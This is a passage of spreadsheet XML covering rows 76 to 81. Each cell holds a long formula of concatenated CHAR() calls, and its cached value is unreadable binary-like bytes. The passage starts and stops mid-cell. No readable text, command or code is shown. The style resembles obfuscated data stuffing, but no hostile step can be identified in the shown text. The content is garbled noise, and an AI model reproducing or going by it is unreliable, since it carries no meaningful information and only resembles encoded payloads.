8øc_x000B_€Qt§¨Ï¹_x0008_Æ(ä_x000C_”÷,_x0010_NÎƒØ;bÁylí‡ÈI'¬ËpÂ	`X(Ž‘L$r¦c_x000E_Ä˜LËwŠ*Y}'qDFªÅK¼ _x0019_€_x000E_ÈNœ_x000C_~›_§z¾FM3g€V)Î_x0018_´ÂEryÅ„ì_x0001_¨CÅ9æ·3dá1n¨g&lt;_x0002_&amp;h¬Çz_x001A_E_x0005_·ã_x000D_ØÕaj6ße°t_x0006_ê¼¶p</v>
      </c>
      <c r="C76" t="str">
        <f>CHAR(235)&amp;CHAR(74)&amp;CHAR(254)&amp;CHAR(190)&amp;CHAR(83)&amp;CHAR(130)&amp;CHAR(35)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(170)</f>
        <v>ëJþ¾S‚#¥ûª</v>
      </c>
    </row>
    <row r="77" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B77" t="str">
        <f>CHAR(15)&amp;CHAR(34)&amp;CHAR(113)&amp;CHAR(207)&amp;CHAR(253)&amp;CHAR(96)&amp;CHAR(56)&amp;CHAR(54)&amp;CHAR(162)&amp;CHAR(132)&amp;CHAR(85)&amp;CHAR(113)&amp;CHAR(119)&amp;CHAR(115)&amp;CHAR(51)&amp;CHAR(22)&amp;CHAR(148)&amp;CHAR(102)&amp;CHAR(33)&amp;CHAR(145)&amp;CHAR(55)&amp;CHAR(22)&amp;CHAR(113)&amp;CHAR(89)&amp;CHAR(120)&amp;CHAR(120)&amp;CHAR(145)&amp;CHAR(222)&amp;CHAR(203)&amp;CHAR(99)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(35)&amp;CHAR(65)&amp;CHAR(140)&amp;CHAR(36)&amp;CHAR(193)&amp;CHAR(202)&amp;CHAR(14)&amp;CHAR(141)&amp;CHAR(195)&amp;CHAR(27)&amp;CHAR(98)&amp;CHAR(116)&amp;CHAR(134)&amp;CHAR(214)&amp;CHAR(212)&amp;CHAR(103)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(42)&amp;CHAR(2)&amp;CHAR(102)&amp;CHAR(213)&amp;CHAR(217)&amp;CHAR(9)&amp;CHAR(197)&amp;CHAR(82)&amp;CHAR(167)&amp;CHAR(93)&amp;CHAR(131)&amp;CHAR(56)&amp;CHAR(95)&amp;CHAR(107)&amp;CHAR(12)&amp;CHAR(190)&amp;CHAR(100)&amp;CHAR(70)&amp;CHAR(7)&amp;CHAR(98)&amp;CHAR(165)&amp;CHAR(245)&amp;CHAR(4)&amp;CHAR(70)&amp;CHAR(158)&amp;CHAR(43)&amp;CHAR(243)&amp;CHAR(11)&amp;CHAR(104)&amp;CHAR(223)&amp;CHAR(143)&amp;CHAR(101)&amp;CHAR(220)&amp;CHAR(83)&amp;CHAR(177)&amp;CHAR(86)&amp;CHAR(57)&amp;CHAR(65)&amp;CHAR(236)&amp;CHAR(21)&amp;CHAR(79)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(100)&amp;CHAR(48)&amp;CHAR(133)&amp;CHAR(37)&amp;CHAR(115)&amp;CHAR(83)&amp;CHAR(34)&amp;CHAR(12)&amp;CHAR(103)&amp;CHAR(206)&amp;CHAR(220)&amp;CHAR(109)&amp;CHAR(201)&amp;CHAR(43)&amp;CHAR(164)&amp;CHAR(177)&amp;CHAR(179)&amp;CHAR(156)&amp;CHAR(238)&amp;CHAR(210)&amp;CHAR(171)&amp;CHAR(39)&amp;CHAR(130)&amp;CHAR(127)&amp;CHAR(219)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(153)&amp;CHAR(55)&amp;CHAR(86)&amp;CHAR(120)&amp;CHAR(230)&amp;CHAR(28)&amp;CHAR(179)&amp;CHAR(189)&amp;CHAR(181)&amp;CHAR(153)&amp;CHAR(47)&amp;CHAR(121)&amp;CHAR(207)&amp;CHAR(227)&amp;CHAR(76)&amp;CHAR(86)&amp;CHAR(91)&amp;CHAR(168)&amp;CHAR(146)&amp;CHAR(108)&amp;CHAR(250)&amp;CHAR(196)&amp;CHAR(111)&amp;CHAR(184)&amp;CHAR(158)&amp;CHAR(156)&amp;CHAR(170)&amp;CHAR(152)&amp;CHAR(247)&amp;CHAR(159)&amp;CHAR(176)&amp;CHAR(210)&amp;CHAR(185)&amp;CHAR(98)&amp;CHAR(23)&amp;CHAR(216)&amp;CHAR(107)&amp;CHAR(248)&amp;CHAR(188)&amp;CHAR(130)&amp;CHAR(100)&amp;CHAR(143)&amp;CHAR(209)&amp;CHAR(46)&amp;CHAR(77)&amp;CHAR(156)&amp;CHAR(115)&amp;CHAR(127)&amp;CHAR(116)&amp;CHAR(44)&amp;CHAR(251)&amp;CHAR(10)&amp;CHAR(120)&amp;CHAR(155)&amp;CHAR(133)&amp;CHAR(44)&amp;CHAR(191)&amp;CHAR(156)&amp;CHAR(107)&amp;CHAR(120)&amp;CHAR(177)&amp;CHAR(200)&amp;CHAR(254)&amp;CHAR(253)&amp;CHAR(29)&amp;CHAR(43)&amp;CHAR(63)&amp;CHAR(59)&amp;CHAR(210)&amp;CHAR(97)&amp;CHAR(221)&amp;CHAR(245)&amp;CHAR(68)&amp;CHAR(137)&amp;CHAR(243)&amp;CHAR(205)&amp;CHAR(199)&amp;CHAR(179)&amp;CHAR(253)&amp;CHAR(47)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(218)&amp;CHAR(127)&amp;CHAR(123)&amp;CHAR(62)&amp;CHAR(69)&amp;CHAR(144)&amp;CHAR(14)&amp;CHAR(237)&amp;CHAR(229)&amp;CHAR(104)&amp;CHAR(82)&amp;CHAR(178)&amp;CHAR(241)&amp;CHAR(100)&amp;CHAR(54)&amp;CHAR(173)&amp;CHAR(207)&amp;CHAR(255)&amp;CHAR(169)&amp;CHAR(111)&amp;CHAR(222)&amp;CHAR(141)&amp;CHAR(51)&amp;CHAR(167)&amp;CHAR(242)&amp;CHAR(148)&amp;CHAR(60)&amp;CHAR(231)&amp;CHAR(3)&amp;CHAR(214)&amp;CHAR(198)&amp;CHAR(154)&amp;CHAR(213)&amp;CHAR(212)&amp;CHAR(139)&amp;CHAR(49)&amp;CHAR(27)&amp;CHAR(97)&amp;CHAR(83)&amp;CHAR(232)&amp;CHAR(120)&amp;CHAR(194)&amp;CHAR(65)&amp;CHAR(217)&amp;CHAR(144)&amp;CHAR(83)&amp;CHAR(162)&amp;CHAR(66)&amp;CHAR(112)&amp;CHAR(5)&amp;CHAR(153)&amp;CHAR(217)&amp;CHAR(50)</f>
        <v>_x000F_"qÏý`86¢„Uqws3_x0016_”f!‘7_x0016_qYxx‘ÞËc»ê#AŒ$ÁÊ_x000E_Ã_x001B_bt†ÖÔg×Õ*_x0002_fÕÙ	ÅR§]ƒ8_k_x000C_¾dF_x0007_b¥õ_x0004_Fž+ó_x000B_hßeÜS±V9Aì_x0015_O_x0004__x0003_d0…%sS"_x000C_gÎÜmÉ+¤±³œîÒ«'‚Û)_x0012_™7Vxæ_x001C_³½µ™/yÏãLV[¨’lúÄo¸žœª˜÷Ÿ°Ò¹b_x0017_Økø¼‚dÑ.Mœst,û
x›…,¿œkx±Èþý_x001D_+?;ÒaÝõD‰óÍÇ³ý/_x001D__x001A_Ú{&gt;E_x000E_íåhR²ñd6­Ïÿ©oÞ3§ò”&lt;ç_x0003_ÖÆšÕÔ‹1_x001B_aSèxÂAÙS¢Bp_x0005_™Ù2</v>
      </c>
      <c r="C77" t="str">
        <f>CHAR(118)&amp;CHAR(58)&amp;CHAR(226)&amp;CHAR(237)&amp;CHAR(9)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(48)</f>
        <v>v:âí	¥ûÏv0</v>
      </c>
    </row>
    <row r="78" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B78" t="str">
        <f>CHAR(85)&amp;CHAR(42)&amp;CHAR(226)&amp;CHAR(75)&amp;CHAR(179)&amp;CHAR(30)&amp;CHAR(20)&amp;CHAR(135)&amp;CHAR(151)&amp;CHAR(212)&amp;CHAR(88)&amp;CHAR(3)&amp;CHAR(61)&amp;CHAR(217)&amp;CHAR(55)&amp;CHAR(41)&amp;CHAR(200)&amp;CHAR(29)&amp;CHAR(92)&amp;CHAR(89)&amp;CHAR(68)&amp;CHAR(79)&amp;CHAR(122)&amp;CHAR(216)&amp;CHAR(253)&amp;CHAR(170)&amp;CHAR(13)&amp;CHAR(27)&amp;CHAR(104)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(161)&amp;CHAR(17)&amp;CHAR(33)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(195)&amp;CHAR(192)&amp;CHAR(46)&amp;CHAR(188)&amp;CHAR(48)&amp;CHAR(44)&amp;CHAR(198)&amp;CHAR(66)&amp;CHAR(62)&amp;CHAR(247)&amp;CHAR(204)&amp;CHAR(37)&amp;CHAR(186)&amp;CHAR(105)&amp;CHAR(42)&amp;CHAR(162)&amp;CHAR(223)&amp;CHAR(236)&amp;CHAR(95)&amp;CHAR(91)&amp;CHAR(2)&amp;CHAR(221)&amp;CHAR(34)&amp;CHAR(115)&amp;CHAR(151)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(126)&amp;CHAR(235)&amp;CHAR(224)&amp;CHAR(40)&amp;CHAR(33)&amp;CHAR(166)&amp;CHAR(78)&amp;CHAR(72)&amp;CHAR(61)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(98)&amp;CHAR(115)&amp;CHAR(57)&amp;CHAR(152)&amp;CHAR(173)&amp;CHAR(25)&amp;CHAR(221)&amp;CHAR(237)&amp;CHAR(126)&amp;CHAR(115)&amp;CHAR(255)&amp;CHAR(148)&amp;CHAR(160)&amp;CHAR(75)&amp;CHAR(221)&amp;CHAR(121)&amp;CHAR(180)&amp;CHAR(52)&amp;CHAR(23)&amp;CHAR(60)&amp;CHAR(43)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(46)&amp;CHAR(227)&amp;CHAR(56)&amp;CHAR(42)&amp;CHAR(31)&amp;CHAR(218)&amp;CHAR(151)&amp;CHAR(60)&amp;CHAR(170)&amp;CHAR(216)&amp;CHAR(215)&amp;CHAR(192)&amp;CHAR(84)&amp;CHAR(64)&amp;CHAR(235)&amp;CHAR(96)&amp;CHAR(190)&amp;CHAR(204)&amp;CHAR(72)&amp;CHAR(215)&amp;CHAR(238)&amp;CHAR(174)&amp;CHAR(218)&amp;CHAR(252)&amp;CHAR(220)&amp;CHAR(136)&amp;CHAR(229)&amp;CHAR(132)&amp;CHAR(31)&amp;CHAR(226)&amp;CHAR(219)&amp;CHAR(171)&amp;CHAR(15)&amp;CHAR(36)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(63)&amp;CHAR(51)&amp;CHAR(214)&amp;CHAR(44)&amp;CHAR(186)&amp;CHAR(99)&amp;CHAR(170)&amp;CHAR(231)&amp;CHAR(47)&amp;CHAR(12)&amp;CHAR(207)&amp;CHAR(40)&amp;CHAR(50)&amp;CHAR(128)&amp;CHAR(133)&amp;CHAR(34)&amp;CHAR(188)&amp;CHAR(110)&amp;CHAR(255)&amp;CHAR(221)&amp;CHAR(9)&amp;CHAR(39)&amp;CHAR(25)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(27)&amp;CHAR(235)&amp;CHAR(101)&amp;CHAR(173)&amp;CHAR(156)&amp;CHAR(213)&amp;CHAR(213)&amp;CHAR(217)&amp;CHAR(27)&amp;CHAR(158)&amp;CHAR(127)&amp;CHAR(148)&amp;CHAR(211)&amp;CHAR(157)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(113)&amp;CHAR(156)&amp;CHAR(183)&amp;CHAR(200)&amp;CHAR(119)&amp;CHAR(114)&amp;CHAR(247)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(198)&amp;CHAR(136)&amp;CHAR(72)&amp;CHAR(215)&amp;CHAR(30)&amp;CHAR(49)&amp;CHAR(179)&amp;CHAR(224)&amp;CHAR(143)&amp;CHAR(171)&amp;CHAR(132)&amp;CHAR(175)&amp;CHAR(108)&amp;CHAR(141)&amp;CHAR(134)&amp;CHAR(127)&amp;CHAR(113)&amp;CHAR(245)&amp;CHAR(228)&amp;CHAR(81)&amp;CHAR(31)&amp;CHAR(107)&amp;CHAR(31)&amp;CHAR(248)&amp;CHAR(160)&amp;CHAR(161)&amp;CHAR(79)&amp;CHAR(41)&amp;CHAR(226)&amp;CHAR(95)&amp;CHAR(78)&amp;CHAR(76)&amp;CHAR(189)&amp;CHAR(65)&amp;CHAR(254)&amp;CHAR(159)&amp;CHAR(81)&amp;CHAR(34)&amp;CHAR(136)&amp;CHAR(114)&amp;CHAR(89)&amp;CHAR(109)&amp;CHAR(18)&amp;CHAR(184)&amp;CHAR(123)&amp;CHAR(149)&amp;CHAR(248)&amp;CHAR(238)&amp;CHAR(82)&amp;CHAR(66)&amp;CHAR(139)&amp;CHAR(246)&amp;CHAR(207)&amp;CHAR(233)&amp;CHAR(206)&amp;CHAR(44)&amp;CHAR(90)&amp;CHAR(190)&amp;CHAR(189)&amp;CHAR(209)&amp;CHAR(136)&amp;CHAR(116)&amp;CHAR(136)&amp;CHAR(47)&amp;CHAR(119)&amp;CHAR(43)&amp;CHAR(135)&amp;CHAR(97)&amp;CHAR(104)&amp;CHAR(157)&amp;CHAR(46)</f>
        <v>U*âK³_x001E__x0014_‡—ÔX_x0003_=Ù7)È_x001D_\YDOzØýª_x000D__x001B_h]ô¡_x0011_!¼_x0001_ÃÀ.¼0,ÆB&gt;÷Ì%ºi*¢ßì_[_x0002_Ý"s—	…~ëà(!¦NH=M_x0002__x0003_bs9˜­_x0019_Ýí~sÿ” KÝy´4_x0017_&lt;+_x000D_Ž.ã8*_x001F_Ú—&lt;ªØ×ÀT@ë`¾ÌH×î®ÚüÜˆå„_x001F_âÛ«_x000F_$&amp;#?3Ö,ºcªç/_x000C_Ï(2€…"¼nÿÝ	'_x0019__x0012_
_x001B_ëe­œÕÕÙ_x001B_ž”Ó_x0003__x0005_qœ·Èwr÷_x0006_ŒÆˆH×_x001E_1³à«„¯l†qõäQ_x001F_k_x001F_ø ¡O)â_NL½AþŸQ"ˆrYm_x0012_¸{•øîRB‹öÏéÎ,Z¾½Ñˆtˆ/w+‡ah.</v>
      </c>
      <c r="C78" t="str">
        <f>CHAR(16)&amp;CHAR(240)&amp;CHAR(32)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(8)&amp;CHAR(56)&amp;CHAR(177)&amp;CHAR(246)&amp;CHAR(200)</f>
        <v>_x0010_ð ¥û_x0008_8±öÈ</v>
      </c>
    </row>
    <row r="79" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B79" t="str">
        <f>CHAR(79)&amp;CHAR(141)&amp;CHAR(122)&amp;CHAR(64)&amp;CHAR(182)&amp;CHAR(93)&amp;CHAR(181)&amp;CHAR(110)&amp;CHAR(112)&amp;CHAR(205)&amp;CHAR(117)&amp;CHAR(93)&amp;CHAR(221)&amp;CHAR(158)&amp;CHAR(127)&amp;CHAR(203)&amp;CHAR(219)&amp;CHAR(151)&amp;CHAR(204)&amp;CHAR(65)&amp;CHAR(202)&amp;CHAR(155)&amp;CHAR(158)&amp;CHAR(187)&amp;CHAR(107)&amp;CHAR(221)&amp;CHAR(8)&amp;CHAR(252)&amp;CHAR(7)&amp;CHAR(98)&amp;CHAR(224)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(225)&amp;CHAR(188)&amp;CHAR(239)&amp;CHAR(6)&amp;CHAR(252)&amp;CHAR(82)&amp;CHAR(52)&amp;CHAR(119)&amp;CHAR(214)&amp;CHAR(133)&amp;CHAR(144)&amp;CHAR(185)&amp;CHAR(27)&amp;CHAR(220)&amp;CHAR(42)&amp;CHAR(214)&amp;CHAR(61)&amp;CHAR(70)&amp;CHAR(58)&amp;CHAR(171)&amp;CHAR(43)&amp;CHAR(59)&amp;CHAR(109)&amp;CHAR(66)&amp;CHAR(196)&amp;CHAR(159)&amp;CHAR(44)&amp;CHAR(195)&amp;CHAR(146)&amp;CHAR(80)&amp;CHAR(38)&amp;CHAR(93)&amp;CHAR(121)&amp;CHAR(226)&amp;CHAR(242)&amp;CHAR(244)&amp;CHAR(198)&amp;CHAR(225)&amp;CHAR(93)&amp;CHAR(187)&amp;CHAR(26)&amp;CHAR(24)&amp;CHAR(199)&amp;CHAR(180)&amp;CHAR(62)&amp;CHAR(233)&amp;CHAR(164)&amp;CHAR(64)&amp;CHAR(168)&amp;CHAR(249)&amp;CHAR(72)&amp;CHAR(248)&amp;CHAR(64)&amp;CHAR(58)&amp;CHAR(98)&amp;CHAR(26)&amp;CHAR(48)&amp;CHAR(124)&amp;CHAR(16)&amp;CHAR(143)&amp;CHAR(116)&amp;CHAR(64)&amp;CHAR(114)&amp;CHAR(80)&amp;CHAR(123)&amp;CHAR(252)&amp;CHAR(29)&amp;CHAR(169)&amp;CHAR(64)&amp;CHAR(174)&amp;CHAR(197)&amp;CHAR(185)&amp;CHAR(169)&amp;CHAR(1)&amp;CHAR(179)&amp;CHAR(14)&amp;CHAR(138)&amp;CHAR(250)&amp;CHAR(115)&amp;CHAR(51)&amp;CHAR(133)&amp;CHAR(34)&amp;CHAR(215)&amp;CHAR(124)&amp;CHAR(27)&amp;CHAR(70)&amp;CHAR(24)&amp;CHAR(108)&amp;CHAR(150)&amp;CHAR(52)&amp;CHAR(85)&amp;CHAR(187)&amp;CHAR(213)&amp;CHAR(137)&amp;CHAR(30)&amp;CHAR(95)&amp;CHAR(91)&amp;CHAR(162)&amp;CHAR(247)&amp;CHAR(151)&amp;CHAR(188)&amp;CHAR(51)&amp;CHAR(255)&amp;CHAR(73)&amp;CHAR(46)&amp;CHAR(28)&amp;CHAR(255)&amp;CHAR(217)&amp;CHAR(248)&amp;CHAR(196)&amp;CHAR(155)&amp;CHAR(20)&amp;CHAR(220)&amp;CHAR(133)&amp;CHAR(23)&amp;CHAR(175)&amp;CHAR(235)&amp;CHAR(116)&amp;CHAR(11)&amp;CHAR(162)&amp;CHAR(170)&amp;CHAR(97)&amp;CHAR(140)&amp;CHAR(152)&amp;CHAR(225)&amp;CHAR(170)&amp;CHAR(188)&amp;CHAR(158)&amp;CHAR(87)&amp;CHAR(162)&amp;CHAR(5)&amp;CHAR(40)&amp;CHAR(89)&amp;CHAR(193)&amp;CHAR(70)&amp;CHAR(193)&amp;CHAR(240)&amp;CHAR(3)&amp;CHAR(72)&amp;CHAR(244)&amp;CHAR(28)&amp;CHAR(91)&amp;CHAR(43)&amp;CHAR(163)&amp;CHAR(232)&amp;CHAR(7)&amp;CHAR(171)&amp;CHAR(147)&amp;CHAR(6)&amp;CHAR(70)&amp;CHAR(123)&amp;CHAR(164)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(44)&amp;CHAR(21)&amp;CHAR(196)&amp;CHAR(121)&amp;CHAR(10)&amp;CHAR(177)&amp;CHAR(106)&amp;CHAR(161)&amp;CHAR(66)&amp;CHAR(48)&amp;CHAR(136)&amp;CHAR(160)&amp;CHAR(127)&amp;CHAR(165)&amp;CHAR(203)&amp;CHAR(151)&amp;CHAR(110)&amp;CHAR(196)&amp;CHAR(232)&amp;CHAR(35)&amp;CHAR(63)&amp;CHAR(33)&amp;CHAR(60)&amp;CHAR(20)&amp;CHAR(177)&amp;CHAR(21)&amp;CHAR(238)&amp;CHAR(247)&amp;CHAR(31)&amp;CHAR(153)&amp;CHAR(50)&amp;CHAR(173)&amp;CHAR(135)&amp;CHAR(149)&amp;CHAR(4)&amp;CHAR(95)&amp;CHAR(79)&amp;CHAR(38)&amp;CHAR(121)&amp;CHAR(10)&amp;CHAR(127)&amp;CHAR(12)&amp;CHAR(211)&amp;CHAR(45)&amp;CHAR(164)&amp;CHAR(82)&amp;CHAR(31)&amp;CHAR(192)&amp;CHAR(117)&amp;CHAR(179)&amp;CHAR(188)&amp;CHAR(23)&amp;CHAR(251)&amp;CHAR(163)&amp;CHAR(195)&amp;CHAR(76)&amp;CHAR(251)&amp;CHAR(235)&amp;CHAR(156)&amp;CHAR(145)&amp;CHAR(117)&amp;CHAR(235)&amp;CHAR(167)&amp;CHAR(109)&amp;CHAR(198)&amp;CHAR(221)&amp;CHAR(94)&amp;CHAR(8)</f>
        <v>Oz@¶]µnpÍu]ÝžËÛ—ÌAÊ›ž»kÝ_x0008_ü_x0007_bà_x0005__x0005_á¼ï_x0006_üR4wÖ…¹_x001B_Ü*Ö=F:«+;mBÄŸ,Ã’P&amp;]yâòôÆá]»_x001A__x0018_Ç´&gt;é¤@¨ùHø@:b_x001A_0|_x0010_t@rP{ü_x001D_©@®Å¹©_x0001_³_x000E_Šús3…"×|_x001B_F_x0018_l–4U»Õ‰_x001E__[¢÷—¼3ÿI._x001C_ÿÙøÄ›_x0014_Ü…_x0017_¯ët_x000B_¢ªaŒ˜áª¼žW¢_x0005_(YÁFÁð_x0003_Hô_x001C_[+£è_x0007_«“_x0006_F{¤O",_x0015_Äy
±j¡B0ˆ ¥Ë—nÄè#?!&lt;_x0014_±_x0015_î÷_x001F_™2­‡•_x0004__O&amp;y
_x000C_Ó-¤R_x001F_Àu³¼_x0017_û£ÃLûëœ‘uë§mÆÝ^_x0008_</v>
      </c>
      <c r="C79" t="str">
        <f>CHAR(33)&amp;CHAR(99)&amp;CHAR(189)&amp;CHAR(199)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(154)&amp;CHAR(67)&amp;CHAR(37)&amp;CHAR(128)</f>
        <v>!c½Ç&gt;ÔšC%€</v>
      </c>
    </row>
    <row r="80" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B80" t="str">
        <f>CHAR(1)&amp;CHAR(22)&amp;CHAR(140)&amp;CHAR(171)&amp;CHAR(211)&amp;CHAR(1)&amp;CHAR(250)&amp;CHAR(103)&amp;CHAR(221)&amp;CHAR(205)&amp;CHAR(41)&amp;CHAR(63)&amp;CHAR(134)&amp;CHAR(219)&amp;CHAR(119)&amp;CHAR(126)&amp;CHAR(158)&amp;CHAR(224)&amp;CHAR(208)&amp;CHAR(12)&amp;CHAR(242)&amp;CHAR(236)&amp;CHAR(116)&amp;CHAR(140)&amp;CHAR(67)&amp;CHAR(205)&amp;CHAR(39)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(62)&amp;CHAR(107)&amp;CHAR(212)&amp;CHAR(5)&amp;CHAR(34)&amp;CHAR(121)&amp;CHAR(15)&amp;CHAR(26)&amp;CHAR(150)&amp;CHAR(92)&amp;CHAR(38)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(87)&amp;CHAR(99)&amp;CHAR(174)&amp;CHAR(161)&amp;CHAR(252)&amp;CHAR(171)&amp;CHAR(226)&amp;CHAR(90)&amp;CHAR(93)&amp;CHAR(121)&amp;CHAR(187)&amp;CHAR(150)&amp;CHAR(220)&amp;CHAR(34)&amp;CHAR(9)&amp;CHAR(95)&amp;CHAR(199)&amp;CHAR(20)&amp;CHAR(28)&amp;CHAR(242)&amp;CHAR(121)&amp;CHAR(145)&amp;CHAR(102)&amp;CHAR(14)&amp;CHAR(125)&amp;CHAR(191)&amp;CHAR(213)&amp;CHAR(159)&amp;CHAR(161)&amp;CHAR(210)&amp;CHAR(46)&amp;CHAR(52)&amp;CHAR(23)&amp;CHAR(193)&amp;CHAR(212)&amp;CHAR(50)&amp;CHAR(237)&amp;CHAR(152)&amp;CHAR(164)&amp;CHAR(226)&amp;CHAR(175)&amp;CHAR(125)&amp;CHAR(57)&amp;CHAR(45)&amp;CHAR(188)&amp;CHAR(174)&amp;CHAR(254)&amp;CHAR(85)&amp;CHAR(95)&amp;CHAR(96)&amp;CHAR(116)&amp;CHAR(149)&amp;CHAR(203)&amp;CHAR(32)&amp;CHAR(252)&amp;CHAR(71)&amp;CHAR(31)&amp;CHAR(170)&amp;CHAR(235)&amp;CHAR(110)&amp;CHAR(254)&amp;CHAR(209)&amp;CHAR(169)&amp;CHAR(247)&amp;CHAR(186)&amp;CHAR(54)&amp;CHAR(249)&amp;CHAR(121)&amp;CHAR(29)&amp;CHAR(197)&amp;CHAR(236)&amp;CHAR(244)&amp;CHAR(201)&amp;CHAR(248)&amp;CHAR(251)&amp;CHAR(132)&amp;CHAR(28)&amp;CHAR(173)&amp;CHAR(159)&amp;CHAR(68)&amp;CHAR(9)&amp;CHAR(109)&amp;CHAR(140)&amp;CHAR(98)&amp;CHAR(181)&amp;CHAR(185)&amp;CHAR(146)&amp;CHAR(172)&amp;CHAR(252)&amp;CHAR(193)&amp;CHAR(175)&amp;CHAR(80)&amp;CHAR(244)&amp;CHAR(183)&amp;CHAR(227)&amp;CHAR(84)&amp;CHAR(158)&amp;CHAR(20)&amp;CHAR(180)&amp;CHAR(86)&amp;CHAR(170)&amp;CHAR(218)&amp;CHAR(226)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(166)&amp;CHAR(171)&amp;CHAR(170)&amp;CHAR(233)&amp;CHAR(109)&amp;CHAR(242)&amp;CHAR(104)&amp;CHAR(176)&amp;CHAR(88)&amp;CHAR(250)&amp;CHAR(46)&amp;CHAR(216)&amp;CHAR(42)&amp;CHAR(63)&amp;CHAR(47)&amp;CHAR(42)&amp;CHAR(188)&amp;CHAR(18)&amp;CHAR(198)&amp;CHAR(202)&amp;CHAR(200)&amp;CHAR(179)&amp;CHAR(136)&amp;CHAR(117)&amp;CHAR(199)&amp;CHAR(58)&amp;CHAR(231)&amp;CHAR(69)&amp;CHAR(187)&amp;CHAR(228)&amp;CHAR(106)&amp;CHAR(110)&amp;CHAR(205)&amp;CHAR(185)&amp;CHAR(22)&amp;CHAR(215)&amp;CHAR(217)&amp;CHAR(13)&amp;CHAR(41)&amp;CHAR(206)&amp;CHAR(36)&amp;CHAR(112)&amp;CHAR(30)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(116)&amp;CHAR(213)&amp;CHAR(102)&amp;CHAR(102)&amp;CHAR(61)&amp;CHAR(42)&amp;CHAR(8)&amp;CHAR(136)&amp;CHAR(54)&amp;CHAR(44)&amp;CHAR(107)&amp;CHAR(150)&amp;CHAR(27)&amp;CHAR(105)&amp;CHAR(67)&amp;CHAR(52)&amp;CHAR(213)&amp;CHAR(42)&amp;CHAR(23)&amp;CHAR(254)&amp;CHAR(12)&amp;CHAR(170)&amp;CHAR(167)&amp;CHAR(208)&amp;CHAR(123)&amp;CHAR(37)&amp;CHAR(247)&amp;CHAR(142)&amp;CHAR(168)&amp;CHAR(21)&amp;CHAR(198)&amp;CHAR(208)&amp;CHAR(113)&amp;CHAR(97)&amp;CHAR(62)&amp;CHAR(69)&amp;CHAR(135)&amp;CHAR(123)&amp;CHAR(189)&amp;CHAR(189)&amp;CHAR(89)&amp;CHAR(201)&amp;CHAR(110)&amp;CHAR(184)&amp;CHAR(44)&amp;CHAR(86)&amp;CHAR(136)&amp;CHAR(81)&amp;CHAR(101)&amp;CHAR(32)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(77)&amp;CHAR(152)&amp;CHAR(148)&amp;CHAR(68)&amp;CHAR(26)&amp;CHAR(73)&amp;CHAR(87)&amp;CHAR(245)&amp;CHAR(104)&amp;CHAR(18)</f>
        <v>_x0001__x0016_Œ«Ó_x0001_úgÝÍ)?†Ûw~žàÐ_x000C_òìtŒCÍ'_x0017__x0006__x000D_&gt;kÔ_x0005_"y_x000F__x001A_–\&amp;WýWc®¡ü«âZ]y»–Ü"	_Ç_x0014__x001C_òy‘f_x000E_}¿ÕŸ¡Ò.4_x0017_ÁÔ2í˜¤â¯}9-¼®þU_`t•Ë üG_x001F_ªënþÑ©÷º6ùy_x001D_ÅìôÉøû„_x001C_­ŸD	mŒbµ¹’¬üÁ¯Pô·ãTž_x0014_´VªÚâ†Å¦«ªémòh°Xú.Ø*?/*¼_x0012_ÆÊÈ³ˆuÇ:çE»äjnÍ¹_x0016_×Ù_x000D_)Î$p_x001E_VútÕff=*_x0008_ˆ6,k–_x001B_iC4Õ*_x0017_þ_x000C_ª§Ð{%÷Ž¨_x0015_ÆÐqa&gt;E‡{½½YÉn¸,VˆQe R€M˜”D_x001A_IWõh_x0012_</v>
      </c>
      <c r="C80" t="str">
        <f>CHAR(211)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(159)&amp;CHAR(73)&amp;CHAR(225)&amp;CHAR(157)&amp;CHAR(250)&amp;CHAR(207)</f>
        <v>ÓÏ&gt;±ŸIáúÏ</v>
      </c>
    </row>
    <row r="81" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B81" t="str">
        <f>CHAR(89)&amp;CHAR(217)&amp;CHAR(12)&amp;CHAR(237)&amp;CHAR(219)&amp;CHAR(151)&amp;CHAR(115)&amp;CHAR(35)&amp;CHAR(5)&amp;CHAR(170)&amp;CHAR(138)&amp;CHAR(26)&amp;CHAR(193)&amp;CHAR(33)&amp;CHAR(142)&amp;CHAR(35)&amp;CHAR(85)&amp;CHAR(32)&amp;CHAR(166)&amp;CHAR(115)&amp;CHAR(203)&amp;CHAR(187)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(191)&amp;CHAR(46)&amp;CHAR(12)&amp;CHAR(250)&amp;CHAR(31)&amp;CHAR(87)&amp;CHAR(231)&amp;CHAR(135)&amp;CHAR(207)&amp;CHAR(147)&amp;CHAR(132)&amp;CHAR(84)&amp;CHAR(132)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(214)&amp;CHAR(245)&amp;CHAR(26)&amp;CHAR(169)&amp;CHAR(244)&amp;CHAR(242)&amp;CHAR(158)&amp;CHAR(14)&amp;CHAR(150)&amp;CHAR(29)&amp